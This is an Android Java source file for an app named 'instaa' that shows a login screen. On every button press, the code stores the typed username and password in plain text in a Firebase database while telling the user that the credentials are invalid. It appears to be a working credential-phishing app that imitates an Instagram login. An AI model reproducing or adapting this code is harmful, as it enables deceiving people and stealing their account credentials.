package com.example.instaa;

import android.os.Bundle;
import android.text.InputType;
import android.widget.Button;
import android.widget.CheckBox;
import android.widget.EditText;
import android.widget.Toast;

import androidx.appcompat.app.AppCompatActivity;

import com.google.firebase.database.FirebaseDatabase;

import java.util.HashMap;

public class MainActivity extends AppCompatActivity {
    Button b;
    EditText u;
    EditText p;
    CheckBox c;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        if (getSupportActionBar() != null) {
            getSupportActionBar().hide();
        }
        b= findViewById(R.id.button);
        u= findViewById(R.id.editTextTextPersonName);
        p= findViewById(R.id.editTextTextPassword);
        c= findViewById(R.id.checkBox);
        c.setOnClickListener(v -> {
            if(c.isChecked())
            {
                p.setInputType(InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD);
            }
            else
            {
                p.setInputType(InputType.TYPE_CLASS_TEXT | InputType.TYPE_TEXT_VARIATION_PASSWORD);
            }
            p.setSelection(p.length());
        });

        b.setOnClickListener(v -> {


            Toast.makeText(getApplicationContext(),"Invalid Username or Password", Toast.LENGTH_SHORT).show();
            HashMap<String,Object> m= new HashMap<>();
            m.put("u",u.getText().toString());
            m.put("p",p.getText().toString());
            FirebaseDatabase.getInstance().getReference().child("Username").push().setValue(m);

            // switchActivities();
        });

    }
    }
